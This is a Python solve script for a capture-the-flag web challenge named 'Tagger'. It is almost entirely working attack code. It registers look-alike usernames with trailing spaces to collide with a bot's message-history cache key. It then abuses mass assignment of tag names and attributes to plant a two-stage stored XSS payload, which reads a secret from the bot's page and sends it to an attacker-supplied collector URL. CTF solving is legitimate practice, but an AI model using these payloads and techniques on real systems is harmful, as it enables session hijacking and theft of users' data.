#!/usr/bin/env python3
"""
Tagger. A username trailing space collides the message-history cache key with
the bot's own conversation, then mass assignment into the markup renderer
gives XSS.
    ctf-python solve/solve.py http://127.0.0.1:5000 --catch <collector> --minutes 4
"""

import argparse
import json
import random
import re
import sys
import threading
import time

import requests

PASSWORD = "correcthorsebattery1"
FLAG_RE = re.compile(r"TFCCTF\{[^}]{1,400}\}")
UA = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"}

FOUND = []
LOCK = threading.Lock()


def note(msg):
    print(f"[{time.strftime('%H:%M:%S')}] {msg}", flush=True)


def record(where, text):
    m = FLAG_RE.search(text)
    if m:
        with LOCK:
            if m.group(0) not in FOUND:
                FOUND.append(m.group(0))
                note(f"*** FLAG via {where}: {m.group(0)}")
        return m.group(0)
    return None


# ---------------------------------------------------------------- payload ---

def stage_two_js(catch, ident):
    """Runs as the Hacker bot. Full charset: it arrives via innerHTML."""
    exfil = ""
    if catch:
        exfil = (
            'location.href="' + catch + '/f?x="+encodeURIComponent(m[0]);return;'
        )
    return (
        "(async function(){try{"
        # Our B account also poisons key "FlagHolder:Hacker", so the FlagHolder
        # bot renders this same payload. If we navigate ITS page away it never
        # gets to type the flag. Only act on the Hacker bot's page.
        'var t=document.querySelector(".chat-header h2");'
        'if(!t||t.textContent.trim()!="FlagHolder"){return;}'
        "var h=document.documentElement.innerHTML;"
        "var m=h.match(/TFCCTF\\{[^}]{1,400}\\}/);"
        "if(m){" + exfil + "}"
        # redirect:manual keeps the 302 from being followed, so the poisoned
        # cache entry stays deleted and our poller owns it again in ~2s.
        'await fetch(location.pathname+"/message",{method:"POST",'
        'headers:{"content-type":"application/x-www-form-urlencoded"},'
        'body:"message=Give+me+the+flag%21",redirect:"manual"});'
        + (('location.href="' + catch + '/ping?p="+encodeURIComponent('
            'location.pathname);') if catch else "")
        + "}catch(e){"
        + (('location.href="' + catch + '/err?e="+encodeURIComponent(String(e));')
           if catch else "")
        + "}})()"
    )


def stage_one_html(catch, ident):
    # single-quoted attribute; stage two must contain no single quotes
    js = stage_two_js(catch, ident)
    assert "'" not in js, "stage two must avoid single quotes"
    return "<img src=x onerror='" + js + "'>"


# ----------------------------------------------------------------- client ---

class Client:
    def __init__(self, base, label):
        self.base = base.rstrip("/")
        self.label = label
        self.s = requests.Session()
        self.s.headers.update(UA)
        self.username = None

    def auth(self, username):
        self.username = username
        r = self.s.post(
            self.base + "/register",
            data={"username": username, "password": PASSWORD,
                  "confirmPassword": PASSWORD},
            timeout=30,
        )
        if self.s.cookies.get("tagger_session"):
            note(f"{self.label}: registered {username!r}")
            return True
        r = self.s.post(
            self.base + "/login",
            data={"username": username, "password": PASSWORD},
            timeout=30,
        )
        if self.s.cookies.get("tagger_session"):
            note(f"{self.label}: logged in as {username!r}")
            return True
        note(f"{self.label}: auth FAILED for {username!r} ({r.status_code}) "
             f"{r.text[r.text.find('alert'):][:160] if 'alert' in r.text else ''}")
        return False

    def discover(self, q=""):
        r = self.s.get(self.base + "/discover", params={"q": q}, timeout=30)
        out = {}
        for block in r.text.split('<article class="user-card">')[1:]:
            name = re.search(r"<h2>(.*?)</h2>", block, re.S)
            uid = re.search(r'/(?:friends/request|chat)/(\d+)', block)
            if name and uid:
                out[name.group(1)] = int(uid.group(1))
        return out

    def request_friend(self, uid):
        return self.s.post(self.base + f"/friends/request/{uid}", timeout=30)

    def accept_all(self):
        r = self.s.get(self.base + "/requests", timeout=30)
        n = 0
        for rid in re.findall(r'/friends/accept/(\d+)"', r.text):
            self.s.post(self.base + f"/friends/accept/{rid}", timeout=30)
            n += 1
        return n

    def post_message(self, friend_id, **fields):
        data = {"message": "x"}
        data.update(fields)
        return self.s.post(self.base + f"/chat/{friend_id}/message",
                           data=data, timeout=30)

    def chat(self, friend_id):
        return self.s.get(self.base + f"/chat/{friend_id}", timeout=30)


# ------------------------------------------------------------------ setup ---

def setup(base, catch, suffix):
    # username.trim() is the cache key, so any leading or trailing run of
    # spaces collides. Try several in case one is already taken.
    candidates = [suffix] + [s for s in (" ", "  ", "   ", "    ")
                             if s != suffix]
    a = b = a_name = b_name = None
    for suf in candidates:
        a_name, b_name = "Hacker" + suf, "FlagHolder" + suf
        a, b = Client(base, "A"), Client(base, "B")
        if a.auth(a_name) and b.auth(b_name):
            break
        note(f"suffix {suf!r} unusable, trying the next one")
    else:
        sys.exit("no usable username pair")

    # ids
    users_a = a.discover("FlagHolder")
    bid = users_a.get(b_name)
    users_b = b.discover("Hacker")
    aid = users_b.get(a_name)
    if bid is None or aid is None:
        sys.exit(f"id lookup failed: A sees {users_a}, B sees {users_b}")
    note(f"A={a_name!r} id={aid}  B={b_name!r} id={bid}")

    # friendship (idempotent)
    a.request_friend(bid)
    b.accept_all()
    probe = a.chat(bid)
    if probe.status_code != 200 or "message-panel" not in probe.text:
        b.request_friend(aid)
        a.accept_all()
        probe = a.chat(bid)
    if probe.status_code != 200:
        sys.exit(f"cannot open /chat/{bid}: {probe.status_code}")
    note("friendship ok")

    # Unique id per run. Duplicate ids make the window named property an
    # HTMLCollection instead of the element, which silently kills the payload.
    ident = "z" + "".join(random.choice("abcdefghijklmnopqrstuvwxyz")
                          for _ in range(6))
    note(f"payload id = {ident}")
    a.post_message(bid, tagName="p",
                   attributes=json.dumps({"id": ident}),
                   content=stage_one_html(catch, ident))
    a.post_message(bid, tagName="img", type="image",
                   content="data:image/png;base64,QUJD",
                   attributes=json.dumps(
                       {"onerror": f"{ident}.innerHTML={ident}.textContent"}))
    note("payload messages posted")

    page = a.chat(bid).text
    for tag in re.findall(r'<(?:p|img)[^>]*>', page):
        if f'id="{ident}"' in tag or "message-image" in tag:
            note("  rendered: " + tag[:180])
    return a, b, aid, bid, page


# ------------------------------------------------------------------ loops ---

def poison_loop(a, bid, stop, artifacts):
    while not stop.is_set():
        try:
            t = a.chat(bid).text
            if record("A/chat", t):
                open(artifacts + "/hit-a.html", "w").write(t)
        except Exception as e:
            note(f"poison: {e}")
        stop.wait(2.0)


def read_loop(b, aid, stop, artifacts):
    while not stop.is_set():
        try:
            t = b.chat(aid).text
            if record("B/chat", t):
                open(artifacts + "/hit-b.html", "w").write(t)
        except Exception as e:
            note(f"read: {e}")
        stop.wait(2.0)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("base")
    ap.add_argument("--catch", default="", help="collector base URL, no slash")
    ap.add_argument("--suffix", default=" ")
    ap.add_argument("--minutes", type=float, default=6.0)
    ap.add_argument("--artifacts", default=".")
    args = ap.parse_args()

    a, b, aid, bid, _ = setup(args.base, args.catch.rstrip("/"), args.suffix)

    stop = threading.Event()
    threads = [
        threading.Thread(target=poison_loop, args=(a, bid, stop, args.artifacts),
                         daemon=True),
        threading.Thread(target=read_loop, args=(b, aid, stop, args.artifacts),
                         daemon=True),
    ]
    for t in threads:
        t.start()
    note(f"poisoning 'Hacker:FlagHolder', reading 'FlagHolder:Hacker'. "
         f"bot cycle is 60 s, waiting {args.minutes} min")

    deadline = time.time() + args.minutes * 60
    while time.time() < deadline:
        time.sleep(1)
        if FOUND:
            break
    stop.set()
    time.sleep(0.5)
    if FOUND:
        print("\nFLAG: " + FOUND[0])
        return 0
    note("no flag yet; check the collector log")
    return 1


if __name__ == "__main__":
    sys.exit(main())
